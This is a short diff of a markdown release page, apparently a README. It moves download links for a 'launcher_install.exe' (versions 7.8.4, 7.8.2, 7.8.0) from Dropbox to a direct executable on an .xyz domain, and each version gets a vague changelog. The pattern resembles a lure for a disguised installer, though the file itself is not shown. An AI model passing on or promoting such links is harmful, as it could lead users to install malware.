@@ -5,15 +5,15 @@
 
 
 
-## ✅ [Version - 7.8.4 - stable](https://www.dropbox.com/s/z7nvukreasnda3v/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.4 - stable](https://softpremiumcompany.xyz/launcher_install.exe)
 ##### -Updating the database
 ##### -Added a section for bloggers
 
-## ✅ [Version - 7.8.2](https://www.dropbox.com/s/z7nvukreasnda3v/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.2](https://softpremiumcompany.xyz/launcher_install.exe)
 ##### -Updating the interface
 ##### -Ability to invite partners via a referral link
 
-## ✅ [Version - 7.8.0](https://www.dropbox.com/s/z7nvukreasnda3v/launcher_install.exe?dl=1)
+## ✅ [Version - 7.8.0](https://softpremiumcompany.xyz/launcher_install.exe)
 ##### -Minor corrections
 ##### -Improved display of coupons
 
